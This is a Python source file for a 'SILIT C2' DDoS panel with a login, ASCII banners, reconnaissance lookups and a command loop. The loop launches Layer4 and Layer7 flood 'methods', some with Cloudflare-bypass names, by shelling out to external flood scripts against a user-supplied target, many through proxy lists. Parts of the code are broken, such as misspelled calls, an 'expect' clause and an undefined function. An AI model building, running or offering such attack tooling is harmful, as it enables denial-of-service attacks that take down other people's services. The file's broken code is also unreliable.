import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxy.txt').readlines()
bots = len(proxys) 


def ascii_vro():
    clear()
    print(f'''      \x1b[38;2;255;0;0m⠀⠀⠀⠀⠀
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.6)
    clear()
    print(f'''



     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.6)
    clear()
    print(f'''







     / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.6)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

def si():
    print('\x1b[38;2;255;255;255m[ \x1b[38;2;233;233;233mSILIT C2 \x1b[38;2;255;255;255m] | \x1b[38;2;233;233;233mWelcome to SILIT C2! \x1b[38;2;255;255;255m| \x1b[38;2;233;233;233mOwner: ./ITINGSSS  \x1b[38;2;255;255;255m| \x1b[38;2;233;233;233mBotnet ')
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;2;255;0;0m╔═══════════════╗
                                \x1b[38;2;255;0;0m║     \x1b[38;2;255;255;255mTools     \x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;255;0;0m║  \x1b[38;2;255;255;255mgeoip               \x1b[38;2;255;0;0m║  \x1b[38;2;255;255;255mreverse-dns           \x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m║  \x1b[38;2;255;255;255mreverseip           \x1b[38;2;255;0;0m║  \x1b[38;2;255;255;255mempty                 \x1b[38;2;255;0;0m║  
                \x1b[38;2;255;0;0m║  \x1b[38;2;255;255;255msubnet-lookup       \x1b[38;2;255;0;0m║  \x1b[38;2;255;255;255mempty                 \x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m║  \x1b[38;2;255;255;255masn-lookup          \x1b[38;2;255;0;0m║  \x1b[38;2;255;255;255mempty                 \x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m║  \x1b[38;2;255;255;255mdns-lookup          \x1b[38;2;255;0;0m║  \x1b[38;2;255;255;255mempty                 \x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m╚══════════════════════╩════════════════════════╝
''')
    
def banners():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;255;255;255mBanners   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;255;255;255mtroll               \x1b[38;2;0;212;14m║  \x1b[38;2;255;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;255;255;255mpikachu             \x1b[38;2;0;212;14m║  \x1b[38;2;255;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;255;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;255;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;255;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;255;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;255;255;255m<empty>             \x1b[38;2;0;212;14m║  \x1b[38;2;255;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')

def layer4():
    clear()
    si()
    print(f'''     \x1b[38;2;255;0;0m⠀⠀⠀⠀⠀
    

                
                t.me/R3V0LUSIJB3N
    ________    __   ___          __    _________ 
  / /______|   |  | |   |        |  |  |__     __|
  | |______    |  | |   |        |  |     |   |    
  \ _______ \  |  | |   |        |  |     |   |
    _______  | |  | |   _______  |  |     |   |
   |________ / |__| |__________| |__|     |___|                          ____ ____  
                      / ___|___ \ 
                     | |     __) |
                     | |___ / __/ 
                      \____|_____|
                                                         
 [PILIH METHOD YG ADA DI BAWAH DAN IKUTIN PERINTAH AGAR KE RUN]
       
[LAYER4]

[TCP]
[L4]

''')

def silitc2():
    clear()
    si()
    print(f'''     \x1b[38;2;255;0;0m⠀⠀⠀⠀⠀
    

                
                   t.me/R3V0LUSIJB3N
    ________    __   ___          __    _________ 
  / /______|   |  | |   |        |  |  |__     __|
  | |______    |  | |   |        |  |     |   |    
  \ _______ \  |  | |   |        |  |     |   |
    _______  | |  | |   _______  |  |     |   |
   |________ / |__| |__________| |__|     |___|                          ____ ____  
                      / ___|___ \ 
                     | |     __) |
                     | |___ / __/ 
                      \____|_____|
                                                        
 [PILIH METHOD YG ADA DI BAWAH DAN IKUTIN PERINTAH AGAR KE RUN]
       
[VVIP]

[Tytd] [MIX]
[Lmao] [SilitV1]
[SilitV2] [CF]
[BYPASS] [KUMASIA]
''')

def layer7():
    clear()
    si()
    print(f'''
     \x1b[38;2;255;0;0m⠀⠀⠀⠀⠀
    

                    t.me/R3V0LUSIJB3N
    ________    __   ___          __    _________ 
  / /______|   |  | |   |        |  |  |__     __|
  | |______    |  | |   |        |  |     |   |    
  \ _______ \  |  | |   |        |  |     |   |
    _______  | |  | |   _______  |  |     |   |
   |________ / |__| |__________| |__|     |___|                          ____ ____  
                      / ___|___ \ 
                     | |     __) |
                     | |___ / __/ 
                      \____|_____|
                                                    
                                                      
 [PILIH METHOD YG ADA DI BAWAH DAN IKUTIN PERINTAH AGAR KE RUN]
       
[LAYER7]

[Nyatu]
[DSTAT]
[Mbool]

''')


def rules():
    clear()
    si()
    print(f'''
                                \x1b[38;2;255;0;0m╔═══════════════╗
                                \x1b[38;2;255;0;0m║     \x1b[38;2;255;255;255mRules     \x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;255;0;0m║ \x1b[38;2;255;255;255m2. Do not attack  go.id ac.id domains  \x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m║ \x1b[38;2;255;255;255m4. Only attack stress testing servers         \x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m║ \x1b[38;2;255;255;255m5. Don't skid the panel                       \x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m║ \x1b[38;2;255;255;255m6. Give a star to the github repository       \x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m║ \x1b[38;2;255;255;255m7. The creator does not do any harm           \x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m╚═══════════════════════════════════════════════╝
''')

def ports():
    clear()
    si()
    print(f'''
                                \x1b[38;2;255;0;0m╔═══════════════╗
                                \x1b[38;2;255;0;0m║     \x1b[38;2;255;255;255mPorts     \x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;255;0;0m║ \x1b[38;2;255;0;0m21 - \x1b[38;2;255;255;255mSFTP       \x1b[38;2;255;0;0m69   - \x1b[38;2;255;255;255mTFTP      \x1b[38;2;255;0;0m5060  - \x1b[38;2;255;255;255mRIP  \x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m║ \x1b[38;2;255;0;0m22 - \x1b[38;2;255;255;255mSSH        \x1b[38;2;255;0;0m80   - \x1b[38;2;255;255;255mHTTP      \x1b[38;2;255;0;0m30120 - \x1b[38;2;255;255;255mFIVEM\x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m║ \x1b[38;2;255;0;0m23 - \x1b[38;2;255;255;255mTELNET     \x1b[38;2;255;0;0m443  - \x1b[38;2;255;255;255mHTTPS                  \x1b[38;2;255;0;0m║   
                \x1b[38;2;255;0;0m║ \x1b[38;2;255;0;0m25 - \x1b[38;2;255;255;255mSMTP       \x1b[38;2;255;0;0m3074 - \x1b[38;2;255;255;255mXBOX                   \x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m║ \x1b[38;2;255;0;0m53 - \x1b[38;2;255;255;255mDNS        \x1b[38;2;255;0;0m5060 - \x1b[38;2;255;255;255mPLAYSATION             \x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m║ \x1b[38;2;255;0;0m25 - \x1b[38;2;255;255;255mMINECRAFT       \x1b[38;2;255;0;0m25565 - \x1b[38;2;255;255;255mMINECRAFT        \x1b[38;2;255;0;0m║
                \x1b[38;2;255;0;0m╚═══════════════════════════════════════════════╝
''')


def menu():
    sys.stdout.write(f"\x1b]2;SILIT C2 --> Botnet: {bots} | Online Users: [1] | Methods: [++] | Bypass: [++] | Amps: [0]\x07")
    clear()
    print("\x1b[38;2;255;255;255m[ \x1b[38;2;233;233;233mSILITC2 \x1b[38;2;255;255;255m] | \x1b[38;2;233;233;233mWelcome to SILIT C2! \x1b[38;2;255;255;255m| \x1b[38;2;233;233;233mOwner: ./ITINGSSS  \x1b[38;2;255;255;255m| \x1b[38;2;233;233;233mBotnet:" + str(bots) + "")
    print("")
    print("""
                    \x1b[38;2;255;0;0m⠀⠀⠀⠀⠀⠀⠀⠀ 

    ________    __   ___          __    _________ 
  / /______|   |  | |   |        |  |  |__     __|
  | |______    |  | |   |        |  |     |   |    
  \ _______ \  |  | |   |        |  |     |   |
    _______  | |  | |   _______  |  |     |   |
   |________ / |__| |__________| |__|     |___|                          ____ ____  
                      / ___|___ \ 
                     | |     __) |
                     | |___ / __/ 
                      \____|_____|
                                                     
 [KETIK help UNTUK MEMUNCULKAN COMMAND]                                                     
                                                      ⠀
""")

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;255;255;255mSILIT@C2\n =>\x1b[38;2;255;255;255m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "silitc2" or cnc == "SILITC2" or cnc == "VVIP" or cnc == "vvip":
           silitc2()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
            banners()

# LAYER 4 METHODS   
 
        elif "TCP" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: TCP METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')

        elif "L4" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                flood_time = cnc.split()[3]
                packet_size = cnc.split()[4]
                num_threads = cnc.split()[5]
                os.system(f'python3 tcp.py {ip} {port} {flood_time} {packet_size} {num_threads}')
            except IndexError:
                print('Usage: L4 <ip> <port> <time> <flood_time> <packet_size> <num_threads>')
                print('Example: L4 1.1.1.1 443 60 512 507')


#SILITC2 METHODS

        elif "Tytd" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} header.txt')
            except IndexError:
                print('Usage: Tytd <url> <threads> METHODS<GET/POST> <time>')
                print('Example: Tytd http://example.com 15000 get 60')
                
        elif "Lmao" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Lmao.go -site {url} -data {method}')
            except IndexError:
                print('Usage: Lmao <url> METHODS<GET/POST>')
                print('Example: Lmao http://example.com GET/POST')                
        elif "SilitV2" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                req_per_sec = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'node SilitV2.js {url} {threads} {req_per_sec} {time}')
            except IndexError:
                print('Usage: SilitV2 <url> <threads> <req_per_sec> <time>')
                print('Example: SilitV2 http://example.com 99550 512 120')         
                               
        elif "MIX" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node MIX.js {url} {threads} {time}')
            except IndexError:
                print('Usage: MIX <url> <threads> <time>')
                print('Example: MIX http://example.com 995 120')         

        elif "BYPASS" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                rps= cnc.split()[4]
                os.system(f'node BYPASS.js {url} {time} {threads} {rps} proxy.txt')
            except IndexError:
                print('Usage: BYPASS <url> <time> <threads> <rps>')
                print('Example: BYPASS http://example.com 90 512 120')        
                 
        elif "DSTAT" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node DSTAT.js {url} {time} proxy.txt')
            except IndexError:
                print('Usage: DSTAT <url> <time>')
                print('Example: DSTAT http://example.com 60')     
                 

        elif "CF" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node CF.js {url} {time} {threads} proxy.txt')
            except IndexError:
                print('Usage: CF <url> <time> <threads>')
                print('Example: CF http://example.com 90 512')                      
                 
        elif "SilitV1" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node SilitV1.js {target} {time} 512 10 proxy.txt')
            except IndexError:
                print('Usage: SilitV1 <url> <time>')
                print('Example: SilitV1 http://example.com 60')  
                
        elif "KUMASIA" in cnc:
           try:
               target = cnc.split()[1]
               time = cnc.split()[2]
               Rate = cnc.split()[3]
               threads = cnc.split()[4]
               proxyFile = cnc.split()[5]
               os.sytem(f'node KUMASIA-TLS.js [TARGET] [TIME] [REQUEST] [THREAD] [PROXY FILE]')
           expect IndexError:
           print('Usage: KUMASIA [target] [time]')
           print('Example >> KUMASIA http://example.com 60')
                 
# LAYER7 METHODS
    
     

     
                
            
                
     
                
        elif "Mbool" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f' ./OMG GET {url} proxy.txt {time} 512 507')
            except IndexError:
                print('Usage: Mbool <url> <time>')
                print('Example: Mbool http://example.com 60')                                                         
         
      
        elif "Nyatu" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node BYPASS-V3.js GET {url} proxy.txt {time} 507 100')
            except IndexError:
                print('Usage: Nyatu <url> <time>')
                print('Example: Nyatu http://example.com 60')                                  

             
# BANNERS

        elif "troll" in cnc:
                print('░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   ')
                print('░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  ')
                print('░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  ')
                print('░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  ')
                print('░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  ')
                print('█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  ')
                print('█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  ')
                print('░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  ')
                print('░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  ')
                print('░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  ')
                print('░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  ')
                print('░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  ')
                print('░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  ')
                print('░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  ')
                print('░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  ')

        elif "pikachu" in cnc:
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠃⠀⠀⠐⠚⠻⢷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢁⣀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠙⢿⣦⣄⠀⠀⠀⠀⣼⠏⣼⣧⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⣴⡿⠃⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⣤⡾⢿⠐⣿⡿⠃⠀⠀⠀⢀⡖⠒⣦⡀⠀⠀⠀⠀⠈⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⢸⠀⠀⣤⡄⠀⠀⠀⢸⣧⣤⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⠀⠀⠀  ')
                print('⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⡠⠃⠀⣀⡈⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⠀⠀⠀⠠⣄⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀  ')
                print('⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢹⡟⠓⣶⠀⠀⠀⠀⣨⣤⣤⡀⠀⠀⠀⠀⢸⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆  ')
                print('⢠⣿⣷⣶⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠘⣧⠀⠀⠈⣄⠀⡏⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⣸⡟⠀⠉⠙⠛⠛⠿⠿⠿⠛  ')
                print('⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠀⠀⣠⣴⡿⠿⣷⣄⠀⠈⠓⠁⠀⠀⠀⠈⠿⣿⡿⠏⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⢾⣿⣯⡀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠒⠛⠛⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⢿⣶⣦⣤⣀⠈⠙⢿⣶⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡿⠃⣠⣿⢋⣽⣷⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⣶⣿⣧⣾⣿⣿⡆⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠈⠻⢦⣤⣤⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠋⠉⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⡀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⢀⡗⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⠙⠓⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣤⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⠁⠀⠀⠀⣸⣿⡀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣉⣀⣀⣀⣤⣾⣿⣷⣶⣶⣶⣿⡿⠿⠿⠛⠛⠿⣷⣤⣄⡈⠀⠉⣿⡆⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠁⠀⠀⠀⠀  ')

                
# TOOLS
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
LAYER4  ► SHOW  METHODS
LAYER7  ► SHOW  METHODS
SILIT C2 ► VVIP USER
BANNERS ► SHOW BANNERS
RULES   ► RULES PANEL
PORTS   ► SHOW ALL PORTS
TOOLS   ► SHOW TOOLS
CLEAR   ► CLEAR TERMINAL
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "apa"
    passwd = "kepo"
    username = input("/ Username tod: ")
    password = getpass.getpass(prompt='/ Password: ')
    if username != user or password != passwd:
        print("")
        print(" User Free So Gaya 🫣")
        sys.exit(1)
    elif username == user and password == passwd:
        print("》》》 Welcome to SILIT C2 .... 《《《")
        time.sleep(0.5)
        ascii_vro()
        main()

login()
